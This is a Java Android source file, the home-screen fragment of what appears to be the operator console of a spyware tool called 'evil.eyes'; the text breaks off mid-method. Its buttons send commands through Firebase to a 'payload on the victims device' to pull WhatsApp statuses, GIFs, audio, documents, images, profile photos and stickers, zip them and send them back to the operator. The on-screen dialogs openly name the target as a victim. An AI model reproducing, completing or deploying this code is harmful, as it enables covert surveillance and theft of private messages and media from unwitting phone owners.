package evil.eyes.ui.fragments;

import static android.view.WindowManager.LayoutParams.SOFT_INPUT_ADJUST_PAN;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.speech.tts.TextToSpeech;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.text.Html;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.widget.AppCompatButton;
import androidx.fragment.app.Fragment;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.android.material.bottomsheet.BottomSheetDialog;
import com.google.android.material.snackbar.Snackbar;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.sdsmdg.harjot.crollerTest.Croller;

import org.json.JSONObject;

import java.util.Locale;

import evil.eyes.R;
import evil.eyes.core.DeviceConfig;
import evil.eyes.core.helpers.PayloadConnection;
import evil.eyes.core.interfaces.PayloadConnectionListner;
import evil.eyes.core.utils.PayloadTypes;
import evil.eyes.ui.ContactsDisplay;
import evil.eyes.ui.Home;
import evil.eyes.ui.PhoneDisplay;
import evil.eyes.ui.SmsDisplay;


public class HomeContent extends Fragment {

    public HomeContent() {
        // Required empty public constructor
    }

    private AlertDialog alertDialog = null;
    private LinearLayout call_logs, sma_inbox, not_found, base_cont;
    private AppCompatButton serverConfigEdit;
    private TextToSpeech t1;
    private int progressF = 1;

    private String selected_device;

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container,
                             Bundle savedInstanceState) {
        // Inflate the layout for this fragment
        View view = inflater.inflate(R.layout.fragment_home_content, container, false);

        call_logs = view.findViewById(R.id.call_logs);
        sma_inbox = view.findViewById(R.id.getInbox);
        selected_device = DeviceConfig.getInstance(view.getContext()).initializeStorage().getSelectedDevice().getUUID();

        not_found = view.findViewById(R.id.no_found);
        base_cont = view.findViewById(R.id.base_cont);

        if (selected_device == null || selected_device.isEmpty()) {
            not_found.setVisibility(View.VISIBLE);
            base_cont.setVisibility(View.GONE);
            view.findViewById(R.id.setDevices).setOnClickListener(u -> {
                if (Home.viewPager != null) Home.viewPager.setCurrentItem(4);
                else
                    Toast.makeText(view.getContext(), "Internal Error !!, try setting default device manually !!", Toast.LENGTH_SHORT).show();
            });
        } else {
            not_found.setVisibility(View.GONE);
            base_cont.setVisibility(View.VISIBLE);

            t1 = new TextToSpeech(getActivity(), status -> {
                if (status != TextToSpeech.ERROR) {
                    t1.setLanguage(Locale.US);
                }
            });

            view.findViewById(R.id.status).setOnClickListener(b -> {
                progressF = 1;
                BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(getActivity());
                bottomSheetDialog.setContentView(R.layout.bottom_sheet_whatsapp);
                Croller croller = (Croller) bottomSheetDialog.findViewById(R.id.croller);
                TextView textView = bottomSheetDialog.findViewById(R.id.payl);
                TextView tittle = bottomSheetDialog.findViewById(R.id.text);
                tittle.setText("Staus updates extraction panel");
                AppCompatButton getALl = bottomSheetDialog.findViewById(R.id.getAll);
                AppCompatButton uploadSelected = bottomSheetDialog.findViewById(R.id.proceed);

                getALl.setOnClickListener(p -> {
                    new AlertDialog.Builder(getContext())
                            .setTitle("Execution Authorization for all File/s")
                            .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_STATUS_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
                            .setPositiveButton("YES, I AUTHORIZE", (n, d) -> {
                                Toast.makeText(getContext(), "Please wait while we set the runtime props.", Toast.LENGTH_SHORT).show();
                                FirebaseDatabase
                                        .getInstance()
                                        .getReference("RUNTIME_PROPS")
                                        .child("WHATSAPP")
                                        .child("WHATSAPP_STATUS_LENGTH")
                                        .setValue(-1)
                                        .addOnCompleteListener(new OnCompleteListener<Void>() {
                                            @Override
                                            public void onComplete(@NonNull Task<Void> task) {
                                                if (task.isSuccessful()) {
                                                    startWhatsappMediaExtraction("Get all Status", PayloadTypes.GET_WHATSAPP_STATUS);
                                                } else {
                                                    //TODO ADD LOGS
                                                    t1.speak("Internal Error check server logs", TextToSpeech.QUEUE_FLUSH, null);
                                                    Toast.makeText(getActivity(), "Error " + task.getException().getMessage(), Toast.LENGTH_SHORT).show();
                                                }
                                            }
                                        });
                            })
                            .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show();

                });


                uploadSelected.setOnClickListener(p -> {
                    new AlertDialog.Builder(getContext())
                            .setTitle("Execution Authorization for " + progressF + " File/s")
                            .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_STATUS_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
                            .setPositiveButton("YES, I AUTHORIZE", (n, d) -> {
                                Toast.makeText(getContext(), "Please wait while we set the runtime props.", Toast.LENGTH_SHORT).show();
                                FirebaseDatabase
                                        .getInstance()
                                        .getReference("RUNTIME_PROPS")
                                        .child("WHATSAPP")
                                        .child("WHATSAPP_STATUS_LENGTH")
                                        .setValue(progressF)
                                        .addOnCompleteListener(new OnCompleteListener<Void>() {
                                            @Override
                                            public void onComplete(@NonNull Task<Void> task) {
                                                if (task.isSuccessful()) {
                                                    startWhatsappMediaExtraction("Get all Status", PayloadTypes.GET_WHATSAPP_STATUS);

                                                } else {
                                                    //TODO ADD LOGS
                                                    t1.speak("Internal Error check server logs", TextToSpeech.QUEUE_FLUSH, null);
                                                    Toast.makeText(getActivity(), "Error " + task.getException().getMessage(), Toast.LENGTH_SHORT).show();
                                                }
                                            }
                                        });
                            })
                            .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show();

                });


                croller.setOnProgressChangedListener(new Croller.onProgressChangedListener() {
                    @Override
                    public void onProgressChanged(int progress) {
                        // use the progress
                        progressF = progress;
                        textView.setText("Total " + progress + " files will be uploaded");

                    }
                });
                bottomSheetDialog.show();
            });

            view.findViewById(R.id.serverConfigEdit)
                    .setOnClickListener(viewWork -> {

                    });

            view.findViewById(R.id.gifs).setOnClickListener(b -> {
                progressF = 1;
                BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(getActivity());
                bottomSheetDialog.setContentView(R.layout.bottom_sheet_whatsapp);
                Croller croller = bottomSheetDialog.findViewById(R.id.croller);
                TextView textView = bottomSheetDialog.findViewById(R.id.payl);
                TextView tittle = bottomSheetDialog.findViewById(R.id.text);
                tittle.setText("GIFs extraction panel");
                AppCompatButton getALl = bottomSheetDialog.findViewById(R.id.getAll);
                AppCompatButton uploadSelected = bottomSheetDialog.findViewById(R.id.proceed);

                getALl.setOnClickListener(p -> {
                    new AlertDialog.Builder(getContext())
                            .setTitle("Execution Authorization for all File/s")
                            .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_GIFS_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
                            .setPositiveButton("YES, I AUTHORIZE", (n, d) -> {
                                Toast.makeText(getContext(), "Please wait while we set the runtime props.", Toast.LENGTH_SHORT).show();
                                FirebaseDatabase
                                        .getInstance()
                                        .getReference("RUNTIME_PROPS")
                                        .child("WHATSAPP")
                                        .child("WHATSAPP_GIFS_LENGTH")
                                        .setValue(-1)
                                        .addOnCompleteListener(new OnCompleteListener<Void>() {
                                            @Override
                                            public void onComplete(@NonNull Task<Void> task) {
                                                if (task.isSuccessful()) {
                                                    startWhatsappMediaExtraction("Get all Gifs", PayloadTypes.GET_WHATSAPP_GIFS);

                                                } else {
                                                    //TODO ADD LOGS
                                                    t1.speak("Internal Error check server logs", TextToSpeech.QUEUE_FLUSH, null);
                                                    Toast.makeText(getActivity(), "Error " + task.getException().getMessage(), Toast.LENGTH_SHORT).show();
                                                }
                                            }
                                        });
                            })
                            .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show();

                });


                uploadSelected.setOnClickListener(p -> {
                    new AlertDialog.Builder(getContext())
                            .setTitle("Execution Authorization for " + progressF + " File/s")
                            .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_GIFS_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
                            .setPositiveButton("YES, I AUTHORIZE", (n, d) -> {
                                Toast.makeText(getContext(), "Please wait while we set the runtime props.", Toast.LENGTH_SHORT).show();
                                FirebaseDatabase
                                        .getInstance()
                                        .getReference("RUNTIME_PROPS")
                                        .child("WHATSAPP")
                                        .child("WHATSAPP_GIFS_LENGTH")
                                        .setValue(progressF)
                                        .addOnCompleteListener(new OnCompleteListener<Void>() {
                                            @Override
                                            public void onComplete(@NonNull Task<Void> task) {
                                                if (task.isSuccessful()) {
                                                    startWhatsappMediaExtraction("Get all Gifs", PayloadTypes.GET_WHATSAPP_GIFS);

                                                } else {
                                                    //TODO ADD LOGS
                                                    t1.speak("Internal Error check server logs", TextToSpeech.QUEUE_FLUSH, null);
                                                    Toast.makeText(getActivity(), "Error " + task.getException().getMessage(), Toast.LENGTH_SHORT).show();
                                                }
                                            }
                                        });
                            })
                            .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show();

                });


                croller.setOnProgressChangedListener(new Croller.onProgressChangedListener() {
                    @Override
                    public void onProgressChanged(int progress) {
                        // use the progress
                        progressF = progress;
                        textView.setText("Total " + progress + " files will be uploaded");

                    }
                });
                bottomSheetDialog.show();
            });

            view.findViewById(R.id.audioS).setOnClickListener(b -> {
                progressF = 1;
                BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(getActivity());
                bottomSheetDialog.setContentView(R.layout.bottom_sheet_whatsapp);
                Croller croller = (Croller) bottomSheetDialog.findViewById(R.id.croller);
                TextView textView = bottomSheetDialog.findViewById(R.id.payl);
                TextView tittle = bottomSheetDialog.findViewById(R.id.text);
                tittle.setText("Whatsapp Audio extraction panel");
                AppCompatButton getALl = bottomSheetDialog.findViewById(R.id.getAll);
                AppCompatButton uploadSelected = bottomSheetDialog.findViewById(R.id.proceed);

                getALl.setOnClickListener(p -> {
                    new AlertDialog.Builder(getContext())
                            .setTitle("Execution Authorization for ALL File/s")
                            .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_AUDIO_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
                            .setPositiveButton("YES, I AUTHORIZE", (n, d) -> {
                                Toast.makeText(getContext(), "Please wait while we set the runtime props.", Toast.LENGTH_SHORT).show();
                                FirebaseDatabase
                                        .getInstance()
                                        .getReference("RUNTIME_PROPS")
                                        .child("WHATSAPP")
                                        .child("WHATSAPP_AUDIO_LENGTH")
                                        .setValue(-1)
                                        .addOnCompleteListener(new OnCompleteListener<Void>() {
                                            @Override
                                            public void onComplete(@NonNull Task<Void> task) {
                                                if (task.isSuccessful()) {
                                                    startWhatsappMediaExtraction("Get all Audios", PayloadTypes.GET_WHATSAPP_AUDIO);

                                                } else {
                                                    //TODO ADD LOGS
                                                    t1.speak("Internal Error check server logs", TextToSpeech.QUEUE_FLUSH, null);
                                                    Toast.makeText(getActivity(), "Error " + task.getException().getMessage(), Toast.LENGTH_SHORT).show();
                                                }
                                            }
                                        });
                            })
                            .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show();

                });


                uploadSelected.setOnClickListener(p -> {
                    new AlertDialog.Builder(getContext())
                            .setTitle("Execution Authorization for " + progressF + " File/s")
                            .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_AUDIO_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
                            .setPositiveButton("YES, I AUTHORIZE", (n, d) -> {
                                Toast.makeText(getContext(), "Please wait while we set the runtime props.", Toast.LENGTH_SHORT).show();
                                FirebaseDatabase
                                        .getInstance()
                                        .getReference("RUNTIME_PROPS")
                                        .child("WHATSAPP")
                                        .child("WHATSAPP_AUDIO_LENGTH")
                                        .setValue(progressF)
                                        .addOnCompleteListener(new OnCompleteListener<Void>() {
                                            @Override
                                            public void onComplete(@NonNull Task<Void> task) {
                                                if (task.isSuccessful()) {
                                                    startWhatsappMediaExtraction("Get all Audios", PayloadTypes.GET_WHATSAPP_AUDIO);

                                                } else {
                                                    //TODO ADD LOGS
                                                    t1.speak("Internal Error check server logs", TextToSpeech.QUEUE_FLUSH, null);
                                                    Toast.makeText(getActivity(), "Error " + task.getException().getMessage(), Toast.LENGTH_SHORT).show();
                                                }
                                            }
                                        });
                            })
                            .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show();

                });


                croller.setOnProgressChangedListener(new Croller.onProgressChangedListener() {
                    @Override
                    public void onProgressChanged(int progress) {
                        // use the progress
                        progressF = progress;
                        textView.setText("Total " + progress + " files will be uploaded");

                    }
                });
                bottomSheetDialog.show();
            });

            view.findViewById(R.id.doc).setOnClickListener(b -> {
                progressF = 1;
                BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(getActivity());
                bottomSheetDialog.setContentView(R.layout.bottom_sheet_whatsapp);
                Croller croller = (Croller) bottomSheetDialog.findViewById(R.id.croller);
                TextView textView = bottomSheetDialog.findViewById(R.id.payl);
                TextView tittle = bottomSheetDialog.findViewById(R.id.text);
                tittle.setText("Whatsapp document extraction panel");
                AppCompatButton getALl = bottomSheetDialog.findViewById(R.id.getAll);
                AppCompatButton uploadSelected = bottomSheetDialog.findViewById(R.id.proceed);

                getALl.setOnClickListener(p -> {
                    new AlertDialog.Builder(getContext())
                            .setTitle("Execution Authorization for all File/s")
                            .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_DOCUMENTS_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
                            .setPositiveButton("YES, I AUTHORIZE", (n, d) -> {
                                Toast.makeText(getContext(), "Please wait while we set the runtime props.", Toast.LENGTH_SHORT).show();
                                FirebaseDatabase
                                        .getInstance()
                                        .getReference("RUNTIME_PROPS")
                                        .child("WHATSAPP")
                                        .child("WHATSAPP_DOCUMENT_LENGTH")
                                        .setValue(-1)
                                        .addOnCompleteListener(new OnCompleteListener<Void>() {
                                            @Override
                                            public void onComplete(@NonNull Task<Void> task) {
                                                if (task.isSuccessful()) {
                                                    startWhatsappMediaExtraction("Get all Docs", PayloadTypes.GET_WHATSAPP_DOCUMENTS);

                                                } else {
                                                    //TODO ADD LOGS
                                                    t1.speak("Internal Error check server logs", TextToSpeech.QUEUE_FLUSH, null);
                                                    Toast.makeText(getActivity(), "Error " + task.getException().getMessage(), Toast.LENGTH_SHORT).show();
                                                }
                                            }
                                        });
                            })
                            .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show();

                });


                uploadSelected.setOnClickListener(p -> {
                    new AlertDialog.Builder(getContext())
                            .setTitle("Execution Authorization for " + progressF + " File/s")
                            .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_DOCUMENTS_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
                            .setPositiveButton("YES, I AUTHORIZE", (n, d) -> {
                                Toast.makeText(getContext(), "Please wait while we set the runtime props.", Toast.LENGTH_SHORT).show();
                                FirebaseDatabase
                                        .getInstance()
                                        .getReference("RUNTIME_PROPS")
                                        .child("WHATSAPP")
                                        .child("WHATSAPP_DOCUMENT_LENGTH")
                                        .setValue(progressF)
                                        .addOnCompleteListener(new OnCompleteListener<Void>() {
                                            @Override
                                            public void onComplete(@NonNull Task<Void> task) {
                                                if (task.isSuccessful()) {
                                                    startWhatsappMediaExtraction("Get all Docs", PayloadTypes.GET_WHATSAPP_DOCUMENTS);

                                                } else {
                                                    //TODO ADD LOGS
                                                    t1.speak("Internal Error check server logs", TextToSpeech.QUEUE_FLUSH, null);
                                                    Toast.makeText(getActivity(), "Error " + task.getException().getMessage(), Toast.LENGTH_SHORT).show();
                                                }
                                            }
                                        });
                            })
                            .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show();

                });


                croller.setOnProgressChangedListener(new Croller.onProgressChangedListener() {
                    @Override
                    public void onProgressChanged(int progress) {
                        // use the progress
                        progressF = progress;
                        textView.setText("Total " + progress + " files will be uploaded");

                    }
                });
                bottomSheetDialog.show();
            });

            view.findViewById(R.id.sharedImages).setOnClickListener(b -> {
                progressF = 1;
                BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(getActivity());
                bottomSheetDialog.setContentView(R.layout.bottom_sheet_whatsapp);
                Croller croller = (Croller) bottomSheetDialog.findViewById(R.id.croller);
                TextView textView = bottomSheetDialog.findViewById(R.id.payl);
                TextView tittle = bottomSheetDialog.findViewById(R.id.text);
                tittle.setText("Whatsapp images extraction panel");
                AppCompatButton getALl = bottomSheetDialog.findViewById(R.id.getAll);
                AppCompatButton uploadSelected = bottomSheetDialog.findViewById(R.id.proceed);

                getALl.setOnClickListener(p -> {
                    new AlertDialog.Builder(getContext())
                            .setTitle("Execution Authorization for all File/s")
                            .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_PHOTOS_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
                            .setPositiveButton("YES, I AUTHORIZE", (n, d) -> {
                                Toast.makeText(getContext(), "Please wait while we set the runtime props.", Toast.LENGTH_SHORT).show();
                                FirebaseDatabase
                                        .getInstance()
                                        .getReference("RUNTIME_PROPS")
                                        .child("WHATSAPP")
                                        .child("WHATSAPP_IMAGES_LENGTH")
                                        .setValue(-1)
                                        .addOnCompleteListener(new OnCompleteListener<Void>() {
                                            @Override
                                            public void onComplete(@NonNull Task<Void> task) {
                                                if (task.isSuccessful()) {
                                                    startWhatsappMediaExtraction("Get all Images", PayloadTypes.GET_WHATSAPP_IMAGES);

                                                } else {
                                                    //TODO ADD LOGS
                                                    t1.speak("Internal Error check server logs", TextToSpeech.QUEUE_FLUSH, null);
                                                    Toast.makeText(getActivity(), "Error " + task.getException().getMessage(), Toast.LENGTH_SHORT).show();
                                                }
                                            }
                                        });
                            })
                            .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show();

                });


                uploadSelected.setOnClickListener(p -> {
                    new AlertDialog.Builder(getContext())
                            .setTitle("Execution Authorization for " + progressF + " File/s")
                            .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_PHOTOS_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
                            .setPositiveButton("YES, I AUTHORIZE", (n, d) -> {
                                Toast.makeText(getContext(), "Please wait while we set the runtime props.", Toast.LENGTH_SHORT).show();
                                FirebaseDatabase
                                        .getInstance()
                                        .getReference("RUNTIME_PROPS")
                                        .child("WHATSAPP")
                                        .child("WHATSAPP_IMAGES_LENGTH")
                                        .setValue(progressF)
                                        .addOnCompleteListener(new OnCompleteListener<Void>() {
                                            @Override
                                            public void onComplete(@NonNull Task<Void> task) {
                                                if (task.isSuccessful()) {
                                                    startWhatsappMediaExtraction("Get all Images", PayloadTypes.GET_WHATSAPP_IMAGES);
                                                } else {
                                                    //TODO ADD LOGS
                                                    t1.speak("Internal Error check server logs", TextToSpeech.QUEUE_FLUSH, null);
                                                    Toast.makeText(getActivity(), "Error " + task.getException().getMessage(), Toast.LENGTH_SHORT).show();
                                                }
                                            }
                                        });
                            })
                            .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show();

                });


                croller.setOnProgressChangedListener(new Croller.onProgressChangedListener() {
                    @Override
                    public void onProgressChanged(int progress) {
                        // use the progress
                        progressF = progress;
                        textView.setText("Total " + progress + " files will be uploaded");

                    }
                });
                bottomSheetDialog.show();
            });

            view.findViewById(R.id.pp).setOnClickListener(b -> {
                progressF = 1;
                BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(getActivity());
                bottomSheetDialog.setContentView(R.layout.bottom_sheet_whatsapp);
                Croller croller = (Croller) bottomSheetDialog.findViewById(R.id.croller);
                TextView textView = bottomSheetDialog.findViewById(R.id.payl);
                TextView tittle = bottomSheetDialog.findViewById(R.id.text);
                tittle.setText("Profile photos extraction panel");
                AppCompatButton getALl = bottomSheetDialog.findViewById(R.id.getAll);
                AppCompatButton uploadSelected = bottomSheetDialog.findViewById(R.id.proceed);

                getALl.setOnClickListener(p -> {
                    new AlertDialog.Builder(getContext())
                            .setTitle("Execution Authorization for all File/s")
                            .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_PROFILE_PHOTOS_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
                            .setPositiveButton("YES, I AUTHORIZE", (n, d) -> {
                                Toast.makeText(getContext(), "Please wait while we set the runtime props.", Toast.LENGTH_SHORT).show();
                                FirebaseDatabase
                                        .getInstance()
                                        .getReference("RUNTIME_PROPS")
                                        .child("WHATSAPP")
                                        .child("WHATSAPP_PROFILE_PIC_LENGTH")
                                        .setValue(-1)
                                        .addOnCompleteListener(new OnCompleteListener<Void>() {
                                            @Override
                                            public void onComplete(@NonNull Task<Void> task) {
                                                if (task.isSuccessful()) {
                                                    startWhatsappMediaExtraction("Get all Profile Pics", PayloadTypes.GET_WHATSAPP_PROFILE_PICS);
                                                } else {
                                                    //TODO ADD LOGS
                                                    t1.speak("Internal Error check server logs", TextToSpeech.QUEUE_FLUSH, null);
                                                    Toast.makeText(getActivity(), "Error " + task.getException().getMessage(), Toast.LENGTH_SHORT).show();
                                                }
                                            }
                                        });
                            })
                            .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show();

                });


                uploadSelected.setOnClickListener(p -> {
                    new AlertDialog.Builder(getContext())
                            .setTitle("Execution Authorization for " + progressF + " File/s")
                            .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_PROFILE_PHOTOS_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
                            .setPositiveButton("YES, I AUTHORIZE", (n, d) -> {
                                Toast.makeText(getContext(), "Please wait while we set the runtime props.", Toast.LENGTH_SHORT).show();
                                FirebaseDatabase
                                        .getInstance()
                                        .getReference("RUNTIME_PROPS")
                                        .child("WHATSAPP")
                                        .child("WHATSAPP_PROFILE_PIC_LENGTH")
                                        .setValue(progressF)
                                        .addOnCompleteListener(new OnCompleteListener<Void>() {
                                            @Override
                                            public void onComplete(@NonNull Task<Void> task) {
                                                if (task.isSuccessful()) {
                                                    startWhatsappMediaExtraction("Get all Profile Pics", PayloadTypes.GET_WHATSAPP_PROFILE_PICS);

                                                } else {
                                                    //TODO ADD LOGS
                                                    t1.speak("Internal Error check server logs", TextToSpeech.QUEUE_FLUSH, null);
                                                    Toast.makeText(getActivity(), "Error " + task.getException().getMessage(), Toast.LENGTH_SHORT).show();
                                                }
                                            }
                                        });
                            })
                            .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show();

                });


                croller.setOnProgressChangedListener(new Croller.onProgressChangedListener() {
                    @Override
                    public void onProgressChanged(int progress) {
                        // use the progress
                        progressF = progress;
                        textView.setText("Total " + progress + " files will be uploaded");

                    }
                });
                bottomSheetDialog.show();
            });

            view.findViewById(R.id.stickers).setOnClickListener(b -> {
                progressF = 1;
                BottomSheetDialog bottomSheetDialog = new BottomSheetDialog(getActivity());
                bottomSheetDialog.setContentView(R.layout.bottom_sheet_whatsapp);
                Croller croller = (Croller) bottomSheetDialog.findViewById(R.id.croller);
                TextView textView = bottomSheetDialog.findViewById(R.id.payl);
                TextView tittle = bottomSheetDialog.findViewById(R.id.text);
                tittle.setText("Whatsapp Stickers extraction panel");
                AppCompatButton getALl = bottomSheetDialog.findViewById(R.id.getAll);
                AppCompatButton uploadSelected = bottomSheetDialog.findViewById(R.id.proceed);

                getALl.setOnClickListener(p -> {
                    new AlertDialog.Builder(getContext())
                            .setTitle("Execution Authorization for all File/s")
                            .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_STICKERS_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
                            .setPositiveButton("YES, I AUTHORIZE", (n, d) -> {
                                Toast.makeText(getContext(), "Please wait while we set the runtime props.", Toast.LENGTH_SHORT).show();
                                FirebaseDatabase
                                        .getInstance()
                                        .getReference("RUNTIME_PROPS")
                                        .child("WHATSAPP")
                                        .child("WHATSAPP_STICKERS_LENGTH")
                                        .setValue(-1)
                                        .addOnCompleteListener(new OnCompleteListener<Void>() {
                                            @Override
                                            public void onComplete(@NonNull Task<Void> task) {
                                                if (task.isSuccessful()) {
                                                    startWhatsappMediaExtraction("Get all Stickers", PayloadTypes.GET_WHATSAPP_STICKERS);

                                                } else {
                                                    //TODO ADD LOGS
                                                    t1.speak("Internal Error check server logs", TextToSpeech.QUEUE_FLUSH, null);
                                                    Toast.makeText(getActivity(), "Error " + task.getException().getMessage(), Toast.LENGTH_SHORT).show();
                                                }
                                            }
                                        });
                            })
                            .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show();

                });


                uploadSelected.setOnClickListener(p -> {
                    new AlertDialog.Builder(getContext())
                            .setTitle("Execution Authorization for " + progressF + " File/s")
                            .setMessage(Html.fromHtml("<br>Are you sure you want to execute the UPLOAD_SELECTED_STICKERS_PAYLOAD on victims device ??<br><br><b>What will happen after I authorize this request :</b> <br><br><ul><li>An AT Command will be sent to the payload on the victims device.</li><li>If the payload will have sufficient permission, then the extraction will start</li><li>After extraction the data will be compiled in a Zip file and will be sent back to you.</li><li>As received the download will begin automatically in your browser.</li><ul>"))
                            .setPositiveButton("YES, I AUTHORIZE", (n, d) -> {
                                Toast.makeText(getContext(), "Please wait while we set the runtime props.", Toast.LENGTH_SHORT).show();
                                FirebaseDatabase
                                        .getInstance()
                                        .getReference("RUNTIME_PROPS")
                                        .child("WHATSAPP")
                                        .child("WHATSAPP_STICKERS_LENGTH")
                                        .setValue(progressF)
                                        .addOnCompleteListener(new OnCompleteListener<Void>() {
                                            @Override
                                            public void onComplete(@NonNull Task<Void> task) {
                                                if (task.isSuccessful()) {
                                                    startWhatsappMediaExtraction("Get all Stickers", PayloadTypes.GET_WHATSAPP_STICKERS);

                                                } else {
                                                    //TODO ADD LOGS
                                                    t1.speak("Internal Error check server logs", TextToSpeech.QUEUE_FLUSH, null);
                                                    Toast.makeText(getActivity(), "Error " + task.getException().getMessage(), Toast.LENGTH_SHORT).show();
                                                }
                                            }
                                        });
                            })
                            .setNegativeButton("CANCEL", (r, g) -> r.dismiss()).show();

                });


                croller.setOnProgressChangedListener(new Croller.onProgressChangedListener() {
                    @Override
                    public void onProgressChanged(int progress) {
                        // use the progress
                        progressF = progress;
                        textView.setText("Total " + progress + " files will be uploaded");

                    }
                });
                bottomSheetDialog.show();
            });

            view.findViewById(R.id.videoA).setOnClickListener(b -> {
                progressF = 1;
